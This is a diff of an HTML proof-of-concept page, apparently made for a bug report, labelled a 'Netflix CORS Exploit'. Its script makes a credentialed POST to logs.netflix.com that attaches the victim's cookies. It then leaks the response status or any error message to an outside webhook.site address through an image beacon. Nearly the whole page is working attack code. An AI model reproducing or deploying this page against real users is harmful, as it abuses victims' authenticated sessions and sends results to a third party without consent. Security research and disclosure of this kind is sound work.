@@ -1,9 +1,16 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Netflix CORS Exploit</title>
+  </head>
   <body>
+    <h2>CORS PoC Exploit</h2>
+    <h3>Status will be leaked to Webhook</h3>
+
     <script>
       (async () => {
         try {
+          // Construct valid payload (trimmed for brevity)
           const payload = {
             currentState: {
               "4572197127044811": {
@@ -13,39 +20,19 @@
                 id: 4572197127044811,
                 sequence: 1,
                 time: 1746874828147
-              },
-              "4572197459321564": {
-                nfvdid: "REDACTED",  // trimmed for safety
-                type: ["VisitorDeviceId", "AccountIdentity", "Session"],
-                id: 4572197459321564,
-                sequence: 4,
-                time: 1746874828147
               }
-              // [Truncated – you can add the rest as needed]
+              // Add more keys if needed
             },
-            reverseDeltas: [
-              [
-                {
-                  name: "LCP",
-                  id: 4572200327668136,
-                  delta: 3764,
-                  is_back_forward_cache_load: false,
-                  initial_pathname: "/browse",
-                  current_pathname: "/browse",
-                  type: ["WebVitalsLCP", "DiscreteEvent"],
-                  sequence: 65,
-                  time: 1746874838568
-                }
-              ]
-            ],
+            reverseDeltas: [],
             type: "CompactConsolidatedLoggingEnvelope",
             version: 2,
             clientSendTime: 1746874843576
           };
 
+          // Fire credentialed POST request to logs.netflix.com
           const res = await fetch("https://logs.netflix.com/log/www/cl/2", {
             method: "POST",
-            credentials: "include",
+            credentials: "include", // attach victim cookies
             headers: {
               "Content-Type": "application/json",
               "X-Netflix.request.name": "ui/cl",
@@ -57,19 +44,18 @@
             body: JSON.stringify(payload)
           });
 
-          // Leak status to webhook
-          const beacon = new Image();
-          beacon.src =
+          // Leak HTTP status via <img> to your webhook
+          const leak = new Image();
+          leak.src =
             "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
-            "?data=" + encodeURIComponent(JSON.stringify({ status: res.status }));
+            "?status=" + res.status;
         } catch (e) {
-          const beacon = new Image();
-          beacon.src =
+          const err = new Image();
+          err.src =
             "https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be" +
-            "?data=" + encodeURIComponent("error: " + e.message);
+            "?error=" + encodeURIComponent(e.message);
         }
       })();
     </script>
-    <h3>PoC Executed – Check Webhook Inbox</h3>
   </body>
 </html>
